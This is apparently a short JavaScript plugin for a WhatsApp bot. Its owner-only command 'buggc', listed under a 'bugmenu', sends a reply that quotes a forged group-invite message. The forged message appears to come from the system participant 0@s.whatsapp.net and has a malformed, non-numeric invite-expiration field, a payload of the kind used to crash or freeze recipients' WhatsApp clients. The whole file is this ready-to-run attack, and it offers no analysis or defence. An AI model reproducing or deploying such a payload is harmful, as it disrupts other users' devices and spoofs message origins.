let handler  = async (m, { conn }) => {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "groupInviteMessage": {
"groupJid": "120363025461390219@g.us",
"inviteCode": "z0JcSBd3mAhIfSSY",
"inviteExpiration": ` Ainul`,
"groupName": `Ainul`,
"caption": `Ainul`
 }
   }
}

await conn.reply(m.chat, `Ainul`, main)
}
handler.help = ['buggc']
handler.tags = ['bugmenu']
handler.command = /^buggc$/

handler.owner = true

export default handler